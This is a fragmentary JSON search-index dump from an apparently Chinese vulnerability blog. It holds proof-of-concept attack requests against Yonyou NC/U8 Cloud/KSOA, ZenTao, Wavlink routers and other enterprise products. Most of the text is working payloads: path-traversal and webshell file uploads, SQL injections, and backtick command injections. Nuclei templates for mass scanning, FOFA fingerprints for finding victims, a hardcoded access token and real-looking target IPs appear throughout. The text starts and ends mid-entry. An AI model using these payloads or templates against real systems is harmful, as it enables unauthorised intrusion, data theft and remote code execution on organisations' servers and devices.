/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/\u0026chunk=1\u0026chunks=1 HTTP/1.1 Host: {{Hostname}} Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9 --024ff46f71634a1c9bf8ec5820c26fa9-- Content-Disposition: form-data; name=\"file\"; filename=\"test.txt\" 1123213 --024ff46f71634a1c9bf8ec5820c26fa9-- 文件上传路径访问 /nccloud/test.txt ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc-cloud-uploadchunk-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"用友NC-Cloud uploadChunk 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8Bnc-cloud-uploadchunk-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"nuclei批量yaml文件 id: yonyou_NCCloud_uploadChunk_upload info: name: 用友NC Cloud uploadChunk任意文件上传漏洞 author: afan severity: critical tags: yonyou,changjietong,bjxsec,yonyouoa description: fofa app=\"畅捷通-TPlus\" variables: file_name: \"{{to_lower(rand_text_alpha(8))}}.txt\" file_content: \"{{to_lower(rand_text_alpha(26))}}\" requests: - raw: - | POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/\u0026chunk=1\u0026chunks=1 HTTP/1.1 Host: {{Hostname}} Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9 accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ Content-Length: 153 --024ff46f71634a1c9bf8ec5820c26fa9 Content-Disposition: form-data; name=\"file\"; filename=\"{{file_name}}\" {{file_content}} --024ff46f71634a1c9bf8ec5820c26fa9-- - | GET /nccloud/{{file_name}} HTTP/1.1 Host: {{Hostname}} req-condition: true matchers: - type: word words: - \"{{file_content}}\" part: body ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc-cloud-uploadchunk-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"用友NC-Cloud uploadChunk 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8Bnc-cloud-uploadchunk-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"用友NC的download文件存在任意文件读取漏洞 ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc%E7%9A%84download%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"用友NC的download文件存在任意文件读取漏洞","uri":"/%E7%94%A8%E5%8F%8Bnc%E7%9A%84download%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"用友-UFIDA-NC\" ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc%E7%9A%84download%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"用友NC的download文件存在任意文件读取漏洞","uri":"/%E7%94%A8%E5%8F%8Bnc%E7%9A%84download%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc /portal/pt/xml/file/download?pageId=login\u0026filename=..%5Cindex.jsp ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc%E7%9A%84download%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"用友NC的download文件存在任意文件读取漏洞","uri":"/%E7%94%A8%E5%8F%8Bnc%E7%9A%84download%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"yaml 批量检测 id: yonyouNC_download_fileread info: name: 用友NC_download文件读取 author: mhb17 severity: high description: description reference: - https:// tags: fileread requests: - raw: - |+ GET /portal/pt/xml/file/download?pageId=login\u0026filename=..%5Cindex.jsp HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36 Connection: close matchers-condition: and matchers: - type: word part: header words: - '200' - type: word part: body words: - \"response.addHeader\" ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc%E7%9A%84download%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"用友NC的download文件存在任意文件读取漏洞","uri":"/%E7%94%A8%E5%8F%8Bnc%E7%9A%84download%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"用友U8-cloud RegisterServlet接口存在SQL注入漏洞 U8 Cloud是用友公司推出的企业上云数字化平台，为成长型和创新型企业提供全面的云ERP解决方案。 U8 cloud不同于传统的ERP，融合了交易、服务、管理于一体的整体解决方案。U8 cloud集中于企业内部管理管控，管理，规范、高效、协同、透明。通过云模式，低成本，快速部署，即租即用的帮助企业免除硬软件投入的快速搭建企业管理架构。通过云服务连接，业务模式、服务模式的经营创新。 该系统RegisterServlet接口存在SQL注入漏洞，并且属于1day状态。 ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bu8-cloud-registerservlet%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"用友U8-cloud RegisterServlet接口存在SQL注入漏洞","uri":"/%E7%94%A8%E5%8F%8Bu8-cloud-registerservlet%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"用友-U8-Cloud\" ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bu8-cloud-registerservlet%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"用友U8-cloud RegisterServlet接口存在SQL注入漏洞","uri":"/%E7%94%A8%E5%8F%8Bu8-cloud-registerservlet%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc 发送下面的poc，响应包返回123456 的md5为存在漏洞 POST /servlet/RegisterServlet HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36 Connection: close Content-Length: 85 Accept: */* Accept-Language: en Content-Type: application/x-www-form-urlencoded X-Forwarded-For: 127.0.0.1 Accept-Encoding: gzip usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)\u003e0-- 返回 HTTP/1.1 200 OK Connection: close Content-Length: 71Date: Mon, 13 Nov 2023 02:25:54 GMT Server: Apache-Coyote/1.1 Set-Cookie: JSESSIONID=F66A9268A74114BADA7CB11346378B11.server; Path=/; HttpOnly Error:?? nvarchar ? 'e10adc3949ba59abbe56e057f20f883e' ??????? int ???? ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bu8-cloud-registerservlet%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"用友U8-cloud RegisterServlet接口存在SQL注入漏洞","uri":"/%E7%94%A8%E5%8F%8Bu8-cloud-registerservlet%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"用友U8-Cloud upload任意文件上传漏洞 该系统upload.jsp存在任意文件上传漏洞，攻击者可通过该漏洞上传木马，远程控制服务器 ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bu8-cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"用友U8-Cloud upload任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8Bu8-cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"用友-U8-Cloud\" ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bu8-cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"用友U8-Cloud upload任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8Bu8-cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"exp POST /linux/pages/upload.jsp HTTP/1.1 Host: User-Agent: Mozilla/5.0 Connection: close Content-Length: 31 Content-Type: application/x-www-form-urlencoded filename: hack.jsp Accept-Encoding: gzip \u003c% out.println(\"The website has vulnerabilities!!\");%\u003e ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bu8-cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"用友U8-Cloud upload任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8Bu8-cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bu8-cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"用友U8-Cloud upload任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8Bu8-cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"路径 http://ip:port/linux/hack.jsp ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bu8-cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:5:0","tags":["2023hw漏洞"],"title":"用友U8-Cloud upload任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8Bu8-cloud-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## Fofa\rbody=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-queryservice-%E5%A4%84-content-%E5%8F%82%E6%95%B0-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"用友时空 KSOA QueryService 处 content 参数 SQL 注入漏洞","uri":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-queryservice-%E5%A4%84-content-%E5%8F%82%E6%95%B0-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc GET /servlet/com.sksoft.bill.QueryService?service=query\u0026content=select%20sys.fn_varbintohexstr(hashbytes('md5','test')) HTTP/1.1 Host: 1.192.90.153:1111 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-queryservice-%E5%A4%84-content-%E5%8F%82%E6%95%B0-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"用友时空 KSOA QueryService 处 content 参数 SQL 注入漏洞","uri":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-queryservice-%E5%A4%84-content-%E5%8F%82%E6%95%B0-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-servlet-imagefield-%E6%96%87%E4%BB%B6-skeyvalue-%E5%8F%82%E6%95%B0-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"用友时空 KSOA servlet imagefield 文件 sKeyvalue 参数 SQL 注入漏洞","uri":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-servlet-imagefield-%E6%96%87%E4%BB%B6-skeyvalue-%E5%8F%82%E6%95%B0-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc GET /servlet/imagefield?key=readimage\u0026sImgname=password\u0026sTablename=bbs_admin\u0026sKeyname=id\u0026sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1 Host: 1.192.90.153:1111 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-servlet-imagefield-%E6%96%87%E4%BB%B6-skeyvalue-%E5%8F%82%E6%95%B0-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"用友时空 KSOA servlet imagefield 文件 sKeyvalue 参数 SQL 注入漏洞","uri":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-servlet-imagefield-%E6%96%87%E4%BB%B6-skeyvalue-%E5%8F%82%E6%95%B0-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-taskrequestservlet-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"用友时空 KSOA TaskRequestServlet sql注入漏洞","uri":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-taskrequestservlet-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc /servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1*\u0026password=1, ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-taskrequestservlet-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"用友时空 KSOA TaskRequestServlet sql注入漏洞","uri":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-taskrequestservlet-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /useratte/web.php? HTTP/1.1 Host: xx.xx.xx.xx:8443 Cookie: PHPSESSID=xxxxx User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=—————————42328904123665875270630079328 Content-Length: 598 Upgrade-Insecure-Requests: 1 Connection: close —————————–42328904123665875270630079328 Content-Disposition: form-data; name=“file_upload”; filename=“2.php” Content-Type: application/octet-stream \u003c?=phpinfo();\r-----------------------------42328904123665875270630079328\rContent-Disposition: form-data; name=\"id_type\"\r1\r-----------------------------42328904123665875270630079328\rContent-Disposition: form-data; name=\"1_ck\"\r1_radhttp\r-----------------------------42328904123665875270630079328\rContent-Disposition: form-data; name=\"mode\"\rimport\r-----------------------------42328904123665875270630079328—\r```","date":"2023-12-08","objectID":"/%E7%99%BE%E5%8D%93-smart-s85f-web.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"百卓 Smart S85F web.php 后台文件上传漏洞","uri":"/%E7%99%BE%E5%8D%93-smart-s85f-web.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"睿因 Wavlink WL_WNJ575A3 远程命令执行 影响版本 Wavlink WL_WNJ575A3 v.R75A3_V1410_220513 漏洞代码 POC POST /cgi-bin/adm.cgi HTTP/1.1 Host: 192.168.10.1 Content-Length: 91 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://192.168.10.1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*; q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.10.1/set_time.shtml?r=29725 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: session=1243623152 Connection: close page=sysAdm\u0026SYSPASS=password\u0026username='`ls\u003e/etc_ro/lighttpd/www/data.html`'\u0026newpass= 12345678 1.Burp 发包执行命令 2.访问“data.html”查看命令执行结 ","date":"2023-12-08","objectID":"/%E7%9D%BF%E5%9B%A0-wavlink-wl_wnj575a3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:1:0","tags":["2023hw漏洞"],"title":"睿因 Wavlink WL_WNJ575A3 远程命令执行","uri":"/%E7%9D%BF%E5%9B%A0-wavlink-wl_wnj575a3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["2023hw漏洞"],"content":"禅道 16.5 router.class.php SQL注入漏洞 POST /user-login.html account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23 ","date":"2023-12-08","objectID":"/%E7%A6%85%E9%81%93-16.5-router.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"禅道 16.5 router.class.php SQL注入漏洞","uri":"/%E7%A6%85%E9%81%93-16.5-router.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"禅道 v18.0-v18.3 存在后台命令执行漏洞 POST /zentaopms/www/index.php?m=zahost\u0026f=create HTTP/1.1 Host: xxx.xxx.xxx.xxx User-Agent:Mozilla/5.0(Windows NT 10.0;Win64;x64;rv:109.0)Gecko/20100101 Firefox/111.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://xxx.xxx.xxx.xxx/zentaopms/www/index.php?m=zahost\u0026f=create Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 134 Origin: http://xxx.xxx.xxx.xxx Connection: close Cookie: zentaosid=fwaf16g51w678678qw686; Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin vsoft=kvm\u0026hostType=physical\u0026name=penson\u0026extranet=xxx.xxx.xxx.xxx%7Ccalc.exe\u0026cpuCores= 2\u0026memory=16\u0026diskSize=16\u0026desc=\u0026uid=640be59da4851\u0026type=z ","date":"2023-12-08","objectID":"/%E7%A6%85%E9%81%93-v18.0-v18.3-%E5%AD%98%E5%9C%A8%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"禅道 v18.0-v18.3 存在后台命令执行漏洞","uri":"/%E7%A6%85%E9%81%93-v18.0-v18.3-%E5%AD%98%E5%9C%A8%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"指挥调度管理平台\" ","date":"2023-12-08","objectID":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-invite_one_member.php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"福建科立讯通信有限公司指挥调度管理平台 invite_one_member.php命令执行漏洞","uri":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-invite_one_member.php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"Exp1 api/client/fax/send_fax.php api/client/fax/send_fax.php Content-Type: multipart/form-data; boundary=---------------------------237165270837920818671657226783 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.2425.64 Safari/537.36 data: \"-----------------------------237165270837920818671657226783\\nContent-Disposition:\\ \\ form-data; name=\\\"fax_extention\\\"\\n\\n1\\n-----------------------------237165270837920818671657226783\\n\\ Content-Disposition: form-data; name=\\\"fax_name\\\"\\n\\n`ping {{dnsip}}`.pdf\\n\\ -----------------------------237165270837920818671657226783\\nContent-Disposition:\\ \\ form-data; name=\\\"sendfile\\\"; filename=\\\"phpinfo.avi\\\"\\nContent-Type: video/avi\\n\\ \\n\u003c?php\\nphpinfo();\\n\\n?\u003e\\n-----------------------------237165270837920818671657226783\\n\\ Content-Disposition: form-data; name=\\\"submit\\\"\\n\\nSubmit\\n-----------------------------237165270837920818671657226783—\" ","date":"2023-12-08","objectID":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-invite_one_member.php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"福建科立讯通信有限公司指挥调度管理平台 invite_one_member.php命令执行漏洞","uri":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-invite_one_member.php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"exp2 custom/zx/fax/send_fax.php User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.369.79 Safari/537.36 Content-Type: multipart/form-data; boundary=---------------------------237165270837920818671657226783 data: \"-----------------------------237165270837920818671657226783\\nContent-Disposition:\\ \\ form-data; name=\\\"fax_extention\\\"\\n\\n1\\n-----------------------------237165270837920818671657226783\\n\\ Content-Disposition: form-data; name=\\\"fax_name\\\"\\n\\n`ping {{dnsip}}`.pdf\\n\\ -----------------------------237165270837920818671657226783\\nContent-Disposition:\\ \\ form-data; name=\\\"sendfile\\\"; filename=\\\"phpinfo.avi\\\"\\nContent-Type: video/avi\\n\\ \\n1\\n-----------------------------237165270837920818671657226783\\nContent-Disposition:\\ \\ form-data; name=\\\"submit\\\"\\n\\nSubmit\\n-----------------------------237165270837920818671657226783—\" ","date":"2023-12-08","objectID":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-invite_one_member.php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"福建科立讯通信有限公司指挥调度管理平台 invite_one_member.php命令执行漏洞","uri":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-invite_one_member.php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"exp3 api/client/autobridgecall.php api/client/autobridgecall.php?callee=1\u0026roomid=`ls\u003e1.txt` ","date":"2023-12-08","objectID":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-invite_one_member.php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"福建科立讯通信有限公司指挥调度管理平台 invite_one_member.php命令执行漏洞","uri":"/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-invite_one_member.php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"Exp4 invite_one_member.php GET /api/client/audiobroadcast/invite_one_member.php?callee=1\u0026roomid=`id\u003e1.txt` HTTP/1.1 Host: 111.21.226.162:7080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) 